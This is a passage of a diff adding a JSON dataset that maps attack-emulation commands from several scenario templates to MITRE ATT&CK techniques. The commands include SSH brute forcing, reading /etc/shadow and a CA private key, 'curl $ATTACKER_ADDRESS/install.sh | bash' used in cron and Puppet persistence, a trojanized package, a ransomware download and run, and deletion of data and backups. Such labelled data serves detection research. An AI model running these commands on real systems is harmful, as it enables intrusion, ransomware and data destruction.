+      "Discovery"
+     ],
+     "type": "sliver-session",
+     "cmd": "netstat"
+    },
+    {
+     "techniques": [
+      "T1016"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "sliver-session",
+     "cmd": "ifconfig"
+    },
+    {
+     "techniques": [
+      "T1003.008",
+      "T1041"
+     ],
+     "tactics": [
+      "Credential Access",
+      "Collection",
+      "Exfiltration"
+     ],
+     "type": "sliver-session",
+     "cmd": "download"
+    },
+    {
+     "techniques": [
+      "T1560.001",
+      "T1074.001"
+     ],
+     "tactics": [
+      "Collection",
+      "Exfiltration"
+     ],
+     "type": "sliver-session",
+     "cmd": "execute"
+    },
+    {
+     "techniques": [
+      "T1041"
+     ],
+     "tactics": [
+      "Exfiltration"
+     ],
+     "type": "sliver-session",
+     "cmd": "download"
+    },
+    {
+     "techniques": [
+      "T1070.004"
+     ],
+     "tactics": [
+      "Defense Evasion"
+     ],
+     "type": "sliver-session",
+     "cmd": "rm"
+    },
+    {
+     "techniques": [
+      "T1005"
+     ],
+     "tactics": [
+      "Collection"
+     ],
+     "type": "sliver-session",
+     "cmd": "download"
+    },
+    {
+     "techniques": [
+      "T1201"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "sliver-session",
+     "cmd": "execute"
+    },
+    {
+     "techniques": [
+      "T1003.008"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "sliver-session",
+     "cmd": "execute"
+    },
+    {
+     "techniques": [
+      "T1201"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "sliver-session",
+     "cmd": "execute"
+    },
+    {
+     "techniques": [
+      "T1105",
+      "T1046",
+      "T1018"
+     ],
+     "tactics": [
+      "Command and Control"
+     ],
+     "type": "sliver-session",
+     "cmd": "upload"
+    },
+    {
+     "techniques": [
+      "T1046",
+      "T1018"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "sliver-session",
+     "cmd": "execute"
+    },
+    {
+     "techniques": [
+      "T1046",
+      "T1018"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "sliver-session",
+     "cmd": "execute"
+    }
+   ]
+  },
+  "scenario_3_a_a.j2": {
+   "scenario": "S3",
+   "source_path": "scenario_3_a_a.j2",
+   "source_sha256": "51a68b0bff42b18b2ea688d2716438983b5119de9d4d0633528bdab46ef805c5",
+   "n_unlabelled_commands": 15,
+   "jinja_control_lines": 0,
+   "commands": [
+    {
+     "techniques": [
+      "T1078.002",
+      "T1110.001",
+      "T1133"
+     ],
+     "tactics": [
+      "Initial Access"
+     ],
+     "type": "shell",
+     "cmd": "hydra -C user_pass_combo.txt -s 10022 $SERVER_ADDRESS ssh"
+    },
+    {
+     "techniques": [
+      "T1078.002"
+     ],
+     "tactics": [
+      "Initial Access"
+     ],
+     "type": "ssh",
+     "cmd": "id"
+    },
+    {
+     "techniques": [
+      "T1040"
+     ],
+     "tactics": [
+      "Credential Access"
+     ],
+     "type": "ssh",
+     "cmd": "tcpdump -A port 21\\n"
+    },
+    {
+     "techniques": [
+      "T1078.003"
+     ],
+     "tactics": [
+      "Privilege Escalation"
+     ],
+     "type": "ssh",
+     "cmd": "sudo -i\\n"
+    },
+    {
+     "techniques": [
+      "T1078.003"
+     ],
+     "tactics": [
+      "Privilege Escalation"
+     ],
+     "type": "ssh",
+     "cmd": "rambo\\n"
+    },
+    {
+     "techniques": [
+      "T1003.008"
+     ],
+     "tactics": [
+      "Credential Access"
+     ],
+     "type": "ssh",
+     "cmd": "cat /etc/shadow\\n"
+    },
+    {
+     "techniques": [
+      "T1213"
+     ],
+     "tactics": [
+      "Collection"
+     ],
+     "type": "ssh",
+     "cmd": "cat /etc/puppetlabs/puppetserver/ca/ca_key.pem\\n"
+    },
+    {
+     "techniques": [
+      "T1039"
+     ],
+     "tactics": [
+      "Collection"
+     ],
+     "type": "ssh",
+     "cmd": "cat /media/share/healthcheck_cron.sh\\n"
+    },
+    {
+     "techniques": [
+      "T1080"
+     ],
+     "tactics": [
+      "Lateral Movement"
+     ],
+     "type": "ssh",
+     "cmd": "curl http://$ATTACKER_ADDRESS:8888/install.sh | bash\\n"
+    },
+    {
+     "techniques": [
+      "T1080"
+     ],
+     "tactics": [
+      "Lateral Movement"
+     ],
+     "type": "ssh",
+     "cmd": ":wq\\n"
+    },
+    {
+     "techniques": [
+      "T1082"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "sysinfo"
+    },
+    {
+     "techniques": [
+      "T1033"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "getuid"
+    },
+    {
+     "techniques": [
+      "T1486",
+      "T1105"
+     ],
+     "tactics": [
+      "Impact",
+      "Command and Control"
+     ],
+     "type": "msf-session",
+     "cmd": "curl http://$ATTACKER_ADDRESS/donotcry > /opt/donotcry"
+    },
+    {
+     "techniques": [
+      "T1486",
+      "T1565.001"
+     ],
+     "tactics": [
+      "Impact"
+     ],
+     "type": "msf-session",
+     "cmd": "/lib64/ld-linux-x86-64.so.2 /opt/donotcry encrypt /media/data/Images"
+    },
+    {
+     "techniques": [
+      "T1018"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "find /media/data/Images"
+    },
+    {
+     "techniques": [
+      "T1087.001"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "cat /etc/passwd"
+    },
+    {
+     "techniques": [
+      "T1531"
+     ],
+     "tactics": [
+      "Impact"
+     ],
+     "type": "msf-session",
+     "cmd": "userdel -f john"
+    },
+    {
+     "techniques": [
+      "T1485"
+     ],
+     "tactics": [
+      "Impact"
+     ],
+     "type": "msf-session",
+     "cmd": "rm -rf /media/data/*"
+    },
+    {
+     "techniques": [
+      "T1490"
+     ],
+     "tactics": [
+      "Impact"
+     ],
+     "type": "msf-session",
+     "cmd": "rm -rf /var/backups/*"
+    },
+    {
+     "techniques": [
+      "T1489"
+     ],
+     "tactics": [
+      "Impact"
+     ],
+     "type": "msf-session",
+     "cmd": "systemctl stop exim4.service"
+    }
+   ]
+  },
+  "scenario_3_a_b.j2": {
+   "scenario": "S3",
+   "source_path": "scenario_3_a_b.j2",
+   "source_sha256": "e1b601954a62b14f95025aabd5ff59247a263de95598b91f2b1a29bb2f393ef0",
+   "n_unlabelled_commands": 11,
+   "jinja_control_lines": 0,
+   "commands": [
+    {
+     "techniques": [
+      "T1078.002",
+      "T1110.001",
+      "T1133"
+     ],
+     "tactics": [
+      "Initial Access"
+     ],
+     "type": "shell",
+     "cmd": "hydra -C user_pass_combo.txt -s 10022 $SERVER_ADDRESS ssh"
+    },
+    {
+     "techniques": [
+      "T1078.002"
+     ],
+     "tactics": [
+      "Initial Access"
+     ],
+     "type": "ssh",
+     "cmd": "id"
+    },
+    {
+     "techniques": [
+      "T1040"
+     ],
+     "tactics": [
+      "Credential Access"
+     ],
+     "type": "ssh",
+     "cmd": "tcpdump -A port 21\\n"
+    },
+    {
+     "techniques": [
+      "T1078.003"
+     ],
+     "tactics": [
+      "Privilege Escalation"
+     ],
+     "type": "ssh",
+     "cmd": "sudo -i\\n"
+    },
+    {
+     "techniques": [
+      "T1078.003"
+     ],
+     "tactics": [
+      "Privilege Escalation"
+     ],
+     "type": "ssh",
+     "cmd": "rambo\\n"
+    },
+    {
+     "techniques": [
+      "T1003.008"
+     ],
+     "tactics": [
+      "Credential Access"
+     ],
+     "type": "ssh",
+     "cmd": "cat /etc/shadow\\n"
+    },
+    {
+     "techniques": [
+      "T1213"
+     ],
+     "tactics": [
+      "Collection"
+     ],
+     "type": "ssh",
+     "cmd": "cat /etc/puppetlabs/puppetserver/ca/ca_key.pem\\n"
+    },
+    {
+     "techniques": [
+      "T1039"
+     ],
+     "tactics": [
+      "Collection"
+     ],
+     "type": "ssh",
+     "cmd": "cat /media/share/healthcheck_cron.sh\\n"
+    },
+    {
+     "techniques": [
+      "T1071",
+      "T1105"
+     ],
+     "tactics": [
+      "Execution",
+      "Command and Control"
+     ],
+     "type": "ssh",
+     "cmd": "curl http://$ATTACKER_ADDRESS:8888/install.sh | bash"
+    },
+    {
+     "techniques": [
+      "T1082"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "sysinfo"
+    },
+    {
+     "techniques": [
+      "T1572"
+     ],
+     "tactics": [
+      "Command and Control"
+     ],
+     "type": "msf-session",
+     "cmd": "portfwd add -l 1881 -r 192.168.100.23 -p 1881"
+    },
+    {
+     "techniques": [
+      "T1210"
+     ],
+     "tactics": [
+      "Lateral Movement"
+     ],
+     "type": "msf-module",
+     "cmd": "exploit/linux/misc/healthcheck_rce"
+    },
+    {
+     "techniques": [
+      "T1486",
+      "T1105"
+     ],
+     "tactics": [
+      "Impact",
+      "Command and Control"
+     ],
+     "type": "msf-session",
+     "cmd": "curl http://$ATTACKER_ADDRESS/donotcry > /opt/donotcry"
+    },
+    {
+     "techniques": [
+      "T1486",
+      "T1565.001"
+     ],
+     "tactics": [
+      "Impact"
+     ],
+     "type": "msf-session",
+     "cmd": "/lib64/ld-linux-x86-64.so.2 /opt/donotcry encrypt /media/data/Images"
+    },
+    {
+     "techniques": [
+      "T1018"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "find /media/data/Images"
+    },
+    {
+     "techniques": [
+      "T1087.001"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "cat /etc/passwd"
+    },
+    {
+     "techniques": [
+      "T1531"
+     ],
+     "tactics": [
+      "Impact"
+     ],
+     "type": "msf-session",
+     "cmd": "userdel -f john"
+    },
+    {
+     "techniques": [
+      "T1485"
+     ],
+     "tactics": [
+      "Impact"
+     ],
+     "type": "msf-session",
+     "cmd": "rm -rf /media/data/*"
+    },
+    {
+     "techniques": [
+      "T1490"
+     ],
+     "tactics": [
+      "Impact"
+     ],
+     "type": "msf-session",
+     "cmd": "rm -rf /var/backups/*"
+    },
+    {
+     "techniques": [
+      "T1489"
+     ],
+     "tactics": [
+      "Impact"
+     ],
+     "type": "msf-session",
+     "cmd": "systemctl stop exim4.service"
+    }
+   ]
+  },
+  "scenario_3_a_c.j2": {
+   "scenario": "S3",
+   "source_path": "scenario_3_a_c.j2",
+   "source_sha256": "901886879993526aef2886c5804d6c5f3b3c5046b62467e2ed0b42c374bc6329",
+   "n_unlabelled_commands": 23,
+   "jinja_control_lines": 0,
+   "commands": [
+    {
+     "techniques": [
+      "T1078.002",
+      "T1110.001",
+      "T1133"
+     ],
+     "tactics": [
+      "Initial Access"
+     ],
+     "type": "shell",
+     "cmd": "hydra -C user_pass_combo.txt -s 10022 $SERVER_ADDRESS ssh"
+    },
+    {
+     "techniques": [
+      "T1078.002"
+     ],
+     "tactics": [
+      "Initial Access"
+     ],
+     "type": "ssh",
+     "cmd": "id"
+    },
+    {
+     "techniques": [
+      "T1040"
+     ],
+     "tactics": [
+      "Credential Access"
+     ],
+     "type": "ssh",
+     "cmd": "tcpdump -A port 21\\n"
+    },
+    {
+     "techniques": [
+      "T1078.003"
+     ],
+     "tactics": [
+      "Privilege Escalation"
+     ],
+     "type": "ssh",
+     "cmd": "sudo -i\\n"
+    },
+    {
+     "techniques": [
+      "T1078.003"
+     ],
+     "tactics": [
+      "Privilege Escalation"
+     ],
+     "type": "ssh",
+     "cmd": "rambo\\n"
+    },
+    {
+     "techniques": [
+      "T1003.008"
+     ],
+     "tactics": [
+      "Credential Access"
+     ],
+     "type": "ssh",
+     "cmd": "cat /etc/shadow\\n"
+    },
+    {
+     "techniques": [
+      "T1213"
+     ],
+     "tactics": [
+      "Collection"
+     ],
+     "type": "ssh",
+     "cmd": "cat /etc/puppetlabs/puppetserver/ca/ca_key.pem\\n"
+    },
+    {
+     "techniques": [
+      "T1039"
+     ],
+     "tactics": [
+      "Collection"
+     ],
+     "type": "ssh",
+     "cmd": "cat /media/share/healthcheck_cron.sh\\n"
+    },
+    {
+     "techniques": [
+      "T1083"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "ls -l /var/www/html/debian\\n"
+    },
+    {
+     "techniques": [
+      "T1059.004"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "ssh",
+     "cmd": "apt update && apt install -y dpkg-dev\\n"
+    },
+    {
+     "techniques": [
+      "T1036.005",
+      "T1564.001"
+     ],
+     "tactics": [
+      "Defense Evasion"
+     ],
+     "type": "ssh",
+     "cmd": "mkdir /tmp/.tmux_data\\n"
+    },
+    {
+     "techniques": [
+      "T1574"
+     ],
+     "tactics": [
+      "Persistence",
+      "Defense Evasion"
+     ],
+     "type": "ssh",
+     "cmd": "dpkg-deb -R /var/www/html/debian/healthcheckd_1.0-1_amd64.deb healthcheckd\\n"
+    },
+    {
+     "techniques": [
+      "T1059",
+      "T1574"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "ssh",
+     "cmd": ":%s/1.0-1/1.0-2/g\\n"
+    },
+    {
+     "techniques": [
+      "T1059",
+      "T1574"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "ssh",
+     "cmd": ":wq\\n"
+    },
+    {
+     "techniques": [
+      "T1053.003",
+      "T1105",
+      "T1071.001"
+     ],
+     "tactics": [
+      "Persistence",
+      "Command and Control"
+     ],
+     "type": "ssh",
+     "cmd": "echo '*/5 * * * * root /usr/bin/curl http://$ATTACKER_ADDRESS:8888/install.sh | /bin/bash' > /etc/cron.d/health"
+    },
+    {
+     "techniques": [
+      "T1053.003",
+      "T1105",
+      "T1071.001"
+     ],
+     "tactics": [
+      "Persistence",
+      "Command and Control"
+     ],
+     "type": "ssh",
+     "cmd": ":wq\\n"
+    },
+    {
+     "techniques": [
+      "T1072"
+     ],
+     "tactics": [
+      "Execution",
+      "Lateral Movement"
+     ],
+     "type": "ssh",
+     "cmd": "dpkg-deb -b healthcheckd /var/www/html/debian/healthcheckd_1.0-2_amd64.deb\\n"
+    },
+    {
+     "techniques": [
+      "T1072"
+     ],
+     "tactics": [
+      "Execution",
+      "Lateral Movement"
+     ],
+     "type": "ssh",
+     "cmd": "dpkg-scanpackages . | gzip -c9  > Packages.gz\\n"
+    },
+    {
+     "techniques": [
+      "T1486",
+      "T1105"
+     ],
+     "tactics": [
+      "Impact",
+      "Command and Control"
+     ],
+     "type": "msf-session",
+     "cmd": "curl http://$ATTACKER_ADDRESS/donotcry > /opt/donotcry"
+    },
+    {
+     "techniques": [
+      "T1486",
+      "T1565.001"
+     ],
+     "tactics": [
+      "Impact"
+     ],
+     "type": "msf-session",
+     "cmd": "/lib64/ld-linux-x86-64.so.2 /opt/donotcry encrypt /media/data/Images"
+    },
+    {
+     "techniques": [
+      "T1018"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "find /media/data/Images"
+    },
+    {
+     "techniques": [
+      "T1087.001"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "cat /etc/passwd"
+    },
+    {
+     "techniques": [
+      "T1531"
+     ],
+     "tactics": [
+      "Impact"
+     ],
+     "type": "msf-session",
+     "cmd": "userdel -f john"
+    },
+    {
+     "techniques": [
+      "T1485"
+     ],
+     "tactics": [
+      "Impact"
+     ],
+     "type": "msf-session",
+     "cmd": "rm -rf /media/data/*"
+    },
+    {
+     "techniques": [
+      "T1490"
+     ],
+     "tactics": [
+      "Impact"
+     ],
+     "type": "msf-session",
+     "cmd": "rm -rf /var/backups/*"
+    },
+    {
+     "techniques": [
+      "T1489"
+     ],
+     "tactics": [
+      "Impact"
+     ],
+     "type": "msf-session",
+     "cmd": "systemctl stop exim4.service"
+    }
+   ]
+  },
+  "scenario_3_a_d.j2": {
+   "scenario": "S3",
+   "source_path": "scenario_3_a_d.j2",
+   "source_sha256": "9aee1834422455f3a021b4129a14ed8d26c2d755dc6747798b1b7a95644e11ea",
+   "n_unlabelled_commands": 14,
+   "jinja_control_lines": 0,
+   "commands": [
+    {
+     "techniques": [
+      "T1078.002",
+      "T1110.001",
+      "T1133"
+     ],
+     "tactics": [
+      "Initial Access"
+     ],
+     "type": "shell",
+     "cmd": "hydra -C user_pass_combo.txt -s 10022 $SERVER_ADDRESS ssh"
+    },
+    {
+     "techniques": [
+      "T1078.003"
+     ],
+     "tactics": [
+      "Initial Access"
+     ],
+     "type": "ssh",
+     "cmd": "id"
+    },
+    {
+     "techniques": [
+      "T1040"
+     ],
+     "tactics": [
+      "Credential Access"
+     ],
+     "type": "ssh",
+     "cmd": "tcpdump -A port 21\\n"
+    },
+    {
+     "techniques": [
+      "T1078.003"
+     ],
+     "tactics": [
+      "Privilege Escalation"
+     ],
+     "type": "ssh",
+     "cmd": "sudo -i\\n"
+    },
+    {
+     "techniques": [
+      "T1078.003"
+     ],
+     "tactics": [
+      "Privilege Escalation"
+     ],
+     "type": "ssh",
+     "cmd": "rambo\\n"
+    },
+    {
+     "techniques": [
+      "T1003.008"
+     ],
+     "tactics": [
+      "Credential Access"
+     ],
+     "type": "ssh",
+     "cmd": "cat /etc/shadow\\n"
+    },
+    {
+     "techniques": [
+      "T1213"
+     ],
+     "tactics": [
+      "Collection"
+     ],
+     "type": "ssh",
+     "cmd": "cat /etc/puppetlabs/puppetserver/ca/ca_key.pem\\n"
+    },
+    {
+     "techniques": [
+      "T1039"
+     ],
+     "tactics": [
+      "Collection"
+     ],
+     "type": "ssh",
+     "cmd": "cat /media/share/healthcheck_cron.sh\\n"
+    },
+    {
+     "techniques": [
+      "T1072",
+      "T1105",
+      "T1059.004"
+     ],
+     "tactics": [
+      "Execution",
+      "Lateral Movement"
+     ],
+     "type": "ssh",
+     "cmd": "class blah2 {\\nexec { 'curl http://$ATTACKER_ADDRESS:8888/install.sh | bash':\\n   path => ['/usr/bin','/bin']\\n}\\n}\\n\\n"
+    },
+    {
+     "techniques": [
+      "T1072",
+      "T1105",
+      "T1059.004"
+     ],
+     "tactics": [
+      "Execution",
+      "Lateral Movement"
+     ],
+     "type": "ssh",
+     "cmd": "node 'linuxshare.attackbed.local' {\\n  class { 'blah2': }\\n}\\n"
+    },
+    {
+     "techniques": [
+      "T1072",
+      "T1105",
+      "T1059.004"
+     ],
+     "tactics": [
+      "Execution",
+      "Lateral Movement"
+     ],
+     "type": "ssh",
+     "cmd": ":wq\\n"
+    },
+    {
+     "techniques": [
+      "T1486",
+      "T1105"
+     ],
+     "tactics": [
+      "Impact",
+      "Command and Control"
+     ],
+     "type": "msf-session",
+     "cmd": "curl http://$ATTACKER_ADDRESS/donotcry > /opt/donotcry"
+    },
+    {
+     "techniques": [
+      "T1486",
+      "T1565.001"
+     ],
+     "tactics": [
+      "Impact"
+     ],
+     "type": "msf-session",
+     "cmd": "/lib64/ld-linux-x86-64.so.2 /opt/donotcry encrypt /media/data/Images"
+    },
+    {
+     "techniques": [
+      "T1018"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "find /media/data/Images"
+    },
+    {
+     "techniques": [
+      "T1087.001"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "cat /etc/passwd"
+    },
+    {
+     "techniques": [
+      "T1531"
+     ],
+     "tactics": [
+      "Impact"
+     ],
+     "type": "msf-session",
+     "cmd": "userdel -f john"
+    },
+    {
+     "techniques": [
+      "T1485"
+     ],
+     "tactics": [
+      "Impact"
+     ],
+     "type": "msf-session",
+     "cmd": "rm -rf /media/data/*"
+    },
+    {
+     "techniques": [
+      "T1490"
+     ],
+     "tactics": [
+      "Impact"
+     ],
+     "type": "msf-session",
+     "cmd": "rm -rf /var/backups/*"
+    },
+    {
+     "techniques": [
+      "T1489"
+     ],
+     "tactics": [
+      "Impact"
+     ],
+     "type": "msf-session",
+     "cmd": "systemctl stop exim4.service"
+    }
+   ]
+  },
+  "scenario_3_b_a.j2": {
+   "scenario": "S3",
+   "source_path": "scenario_3_b_a.j2",
+   "source_sha256": "8751cd07e2ffa6d3811c5c36a56dfe86111d9a9c9e0a70198586b0396dcba47f",
+   "n_unlabelled_commands": 32,
+   "jinja_control_lines": 0,
+   "commands": [
+    {
+     "techniques": [
+      "T1110.001",
+      "T1021.005"
+     ],
+     "tactics": [
+      "Credential Access",
+      "Lateral Movement"
+     ],
+     "type": "vnc",
+     "cmd": "move"
+    },
+    {
+     "techniques": [
+      "T1021.005"
+     ],
+     "tactics": [
+      "Lateral Movement"
+     ],
+     "type": "vnc",
+     "cmd": "click"
+    },
+    {
+     "techniques": [
+      "T1021.005"
+     ],
+     "tactics": [
+      "Lateral Movement"
+     ],
+     "type": "vnc",
+     "cmd": "type"
+    },
+    {
+     "techniques": [
+      "T1021.005"
+     ],
+     "tactics": [
+      "Lateral Movement"
+     ],
+     "type": "vnc",
+     "cmd": "type"
+    },
+    {
+     "techniques": [
+      "T1003.008"
+     ],
+     "tactics": [
+      "Credential Access"
+     ],
+     "type": "vnc",
+     "cmd": "key"
+    },
+    {
+     "techniques": [
+      "T1213"
+     ],
+     "tactics": [
+      "Collection"
+     ],
+     "type": "vnc",
+     "cmd": "key"
+    },
+    {
+     "techniques": [
+      "T1039"
+     ],
+     "tactics": [
+      "Collection"
+     ],
+     "type": "vnc",
+     "cmd": "key"
+    },
+    {
+     "techniques": [
+      "T1105",
+      "T1059.004",
+      "T1053.003",
+      "T1021.005",
+      "T1071.001"
+     ],
+     "tactics": [
+      "Execution",
+      "Defense Evasion",
+      "Persistence",
+      "Command and Control"
+     ],
+     "type": "vnc",
+     "cmd": "type"
+    },
+    {
+     "techniques": [
+      "T1021.005"
+     ],
+     "tactics": [
+      "Lateral Movement"
+     ],
+     "type": "vnc",
+     "cmd": "close"
+    },
+    {
+     "techniques": [
+      "T1082"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "sysinfo"
+    },
+    {
+     "techniques": [
+      "T1033"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "getuid"
+    },
+    {
+     "techniques": [
+      "T1486",
+      "T1105"
+     ],
+     "tactics": [
+      "Impact",
+      "Command and Control"
+     ],
+     "type": "msf-session",
+     "cmd": "curl http://$ATTACKER_ADDRESS/donotcry > /opt/donotcry"
+    },
+    {
+     "techniques": [
+      "T1486",
+      "T1565.001"
+     ],
+     "tactics": [
+      "Impact"
+     ],
+     "type": "msf-session",
+     "cmd": "/lib64/ld-linux-x86-64.so.2 /opt/donotcry encrypt /media/data/Images"
+    },
+    {
+     "techniques": [
+      "T1018"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "find /media/data/Images"
+    },
+    {
+     "techniques": [
+      "T1087.001"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "cat /etc/passwd"
+    },
+    {
+     "techniques": [
+      "T1531"
+     ],
+     "tactics": [
+      "Impact"
+     ],
+     "type": "msf-session",
+     "cmd": "userdel -f john"
+    },
+    {
+     "techniques": [
+      "T1485"
+     ],
+     "tactics": [
+      "Impact"
+     ],
+     "type": "msf-session",
+     "cmd": "rm -rf /media/data/*"
+    },
+    {
+     "techniques": [
+      "T1490"
+     ],
+     "tactics": [
+      "Impact"
+     ],
+     "type": "msf-session",
+     "cmd": "rm -rf /var/backups/*"
+    },
+    {
+     "techniques": [
+      "T1489"
+     ],
+     "tactics": [
+      "Impact"
+     ],
+     "type": "msf-session",
+     "cmd": "systemctl stop exim4.service"
+    }
+   ]
+  },
+  "scenario_3_b_b.j2": {
+   "scenario": "S3",
+   "source_path": "scenario_3_b_b.j2",
+   "source_sha256": "717d88d464a2f39751799961b508862ad5c25bdb5c140e7f8844e9df2a58ab64",
+   "n_unlabelled_commands": 33,
+   "jinja_control_lines": 0,
+   "commands": [
+    {
+     "techniques": [
+      "T1110.001",
+      "T1021.005"
+     ],
+     "tactics": [
+      "Credential Access",
+      "Lateral Movement"
+     ],
+     "type": "vnc",
+     "cmd": "move"
+    },
+    {
+     "techniques": [
+      "T1021.005"
+     ],
+     "tactics": [
+      "Lateral Movement"
+     ],
+     "type": "vnc",
+     "cmd": "click"
+    },
+    {
+     "techniques": [
+      "T1021.005"
+     ],
+     "tactics": [
+      "Lateral Movement"
+     ],
+     "type": "vnc",
+     "cmd": "type"
+    },
+    {
+     "techniques": [
+      "T1021.005"
+     ],
+     "tactics": [
+      "Lateral Movement"
+     ],
+     "type": "vnc",
+     "cmd": "type"
+    },
+    {
+     "techniques": [
+      "T1003.008"
+     ],
+     "tactics": [
+      "Credential Access"
+     ],
+     "type": "vnc",
+     "cmd": "key"
+    },
+    {
+     "techniques": [
+      "T1213"
+     ],
+     "tactics": [
+      "Collection"
+     ],
+     "type": "vnc",
+     "cmd": "key"
+    },
+    {
+     "techniques": [
+      "T1039"
+     ],
+     "tactics": [
+      "Collection"
+     ],
+     "type": "vnc",
+     "cmd": "key"
+    },
+    {
+     "techniques": [
+      "T1021.005"
+     ],
+     "tactics": [
+      "Lateral Movement"
+     ],
+     "type": "vnc",
+     "cmd": "close"
+    },
+    {
+     "techniques": [
+      "T1082"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "sysinfo"
+    },
+    {
+     "techniques": [
+      "T1572"
+     ],
+     "tactics": [
+      "Command and Control"
+     ],
+     "type": "msf-session",
+     "cmd": "portfwd add -l 1881 -r 192.168.100.23 -p 1881"
+    },
+    {
+     "techniques": [
+      "T1210"
+     ],
+     "tactics": [
+      "Lateral Movement"
+     ],
+     "type": "msf-module",
+     "cmd": "exploit/linux/misc/healthcheck_rce"
+    },
+    {
+     "techniques": [
+      "T1082"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "sysinfo"
+    },
+    {
+     "techniques": [
+      "T1033"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "getuid"
+    },
+    {
+     "techniques": [
+      "T1486",
+      "T1105"
+     ],
+     "tactics": [
+      "Impact",
+      "Command and Control"
+     ],
+     "type": "msf-session",
+     "cmd": "curl http://$ATTACKER_ADDRESS/donotcry > /opt/donotcry"
+    },
+    {
+     "techniques": [
+      "T1486",
+      "T1565.001"
+     ],
+     "tactics": [
+      "Impact"
+     ],
+     "type": "msf-session",
+     "cmd": "/lib64/ld-linux-x86-64.so.2 /opt/donotcry encrypt /media/data/Images"
+    },
+    {
+     "techniques": [
+      "T1018"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "find /media/data/Images"
+    },
+    {
+     "techniques": [
+      "T1087.001"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "cat /etc/passwd"
+    },
+    {
+     "techniques": [
+      "T1531"
+     ],
+     "tactics": [
+      "Impact"
+     ],
+     "type": "msf-session",
+     "cmd": "userdel -f john"
+    },
+    {
+     "techniques": [
+      "T1485"
+     ],
+     "tactics": [
+      "Impact"
+     ],
+     "type": "msf-session",
+     "cmd": "rm -rf /media/data/*"
+    },
+    {
+     "techniques": [
+      "T1490"
+     ],
+     "tactics": [
+      "Impact"
+     ],
+     "type": "msf-session",
+     "cmd": "rm -rf /var/backups/*"
+    },
+    {
+     "techniques": [
+      "T1489"
+     ],
+     "tactics": [
+      "Impact"
+     ],
+     "type": "msf-session",
+     "cmd": "systemctl stop exim4.service"
+    }
+   ]
+  },
+  "scenario_3_b_c.j2": {
+   "scenario": "S3",
+   "source_path": "scenario_3_b_c.j2",
+   "source_sha256": "093bc6f5a33f34ac252784798c3d93373e4308bbe1e1989776113fd251277b08",
+   "n_unlabelled_commands": 48,
+   "jinja_control_lines": 0,
+   "commands": [
+    {
+     "techniques": [
+      "T1110.001",
+      "T1021.005"
+     ],
+     "tactics": [
+      "Credential Access",
+      "Lateral Movement"
+     ],
+     "type": "vnc",
+     "cmd": "move"
+    },
+    {
+     "techniques": [
+      "T1021.005"
+     ],
+     "tactics": [
+      "Lateral Movement"
+     ],
+     "type": "vnc",
+     "cmd": "click"
+    },
+    {
+     "techniques": [
+      "T1021.005"
+     ],
+     "tactics": [
+      "Lateral Movement"
+     ],
+     "type": "vnc",
+     "cmd": "type"
+    },
+    {
+     "techniques": [
+      "T1021.005"
+     ],
+     "tactics": [
+      "Lateral Movement"
+     ],
+     "type": "vnc",
+     "cmd": "type"
+    },
+    {
+     "techniques": [
+      "T1003.008"
+     ],
+     "tactics": [
+      "Credential Access"
+     ],
+     "type": "vnc",
+     "cmd": "key"
+    },
+    {
+     "techniques": [
+      "T1213"
+     ],
+     "tactics": [
+      "Collection"
+     ],
+     "type": "vnc",
+     "cmd": "key"
+    },
+    {
+     "techniques": [
+      "T1039"
+     ],
+     "tactics": [
+      "Collection"
+     ],
+     "type": "vnc",
+     "cmd": "key"
+    },
+    {
+     "techniques": [
+      "T1083"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "vnc",
+     "cmd": "key"
+    },
+    {
+     "techniques": [
+      "T1059.004"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "vnc",
+     "cmd": "key"
+    },
+    {
+     "techniques": [
+      "T1036.005",
+      "T1564.001"
+     ],
+     "tactics": [
+      "Defense Evasion"
+     ],
+     "type": "vnc",
+     "cmd": "key"
+    },
+    {
+     "techniques": [
+      "T1574"
+     ],
+     "tactics": [
+      "Persistence",
+      "Defense Evasion"
+     ],
+     "type": "vnc",
+     "cmd": "key"
+    },
+    {
+     "techniques": [
+      "T1059",
+      "T1574"
+     ],
+     "tactics": [
+      "Execution"
